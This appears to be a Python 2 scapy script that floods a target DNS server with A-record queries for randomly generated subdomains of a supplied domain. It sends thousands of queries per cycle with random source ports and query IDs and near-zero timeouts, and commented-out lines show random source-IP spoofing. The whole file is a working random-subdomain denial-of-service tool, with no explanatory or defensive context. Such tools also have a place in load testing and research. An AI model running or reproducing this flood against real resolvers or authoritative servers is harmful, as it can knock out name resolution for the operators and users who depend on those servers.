#!/usr/bin/env python
from scapy.all import *
import random
import string
import sys
import time


def send_A_queries(ip_address, fqdn, iterations):

    domain_string = string.ascii_lowercase + string.digits
    query_type = ['A']
    dns_server = ip_address
    basic_domain = fqdn
    query_count = iterations

    while (query_count != 0):
        # src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        #src_ip = "10.1.0.71"

        a1 = ''.join(random.choice(domain_string) for x in range(10))
        b1 = ''.join(random.choice(domain_string) for y in range(3))
        target1 = a1 + "." + b1 + "." + basic_domain

        packet1 = (IP(dst=dns_server) / UDP(sport=RandShort()) / DNS(id=RandShort(), rd=0,
                                                                                 qd=DNSQR(qname="%s" % target1
,
                                                                                          qtype="%s" % random.
choice(
                                                                                              query_type))))
        res1 = sr(packet1, retry=False, timeout=0.000001, inter=0.00000, verbose=False)
        query_count = query_count - 1



if len(sys.argv) is not 4:
    print "Arguments should be script.py Target_IP domain_name #_of_cycles"
    exit(-1)

target_server = sys.argv[1]
domain_name = sys.argv[2]
number_of_cycles = int(sys.argv[3])
base_offset = 3000

iteration_list = []

for x in range(number_of_cycles):
    iteration_list.append(random.randint(1, 390) + base_offset)

i = 0
for n in iteration_list:
    send_A_queries(target_server, domain_name, n)
    time.sleep(4)
    print "Iteration " + str(i) + " has been completed with " + str(n) + " steps."
    i = i + 1

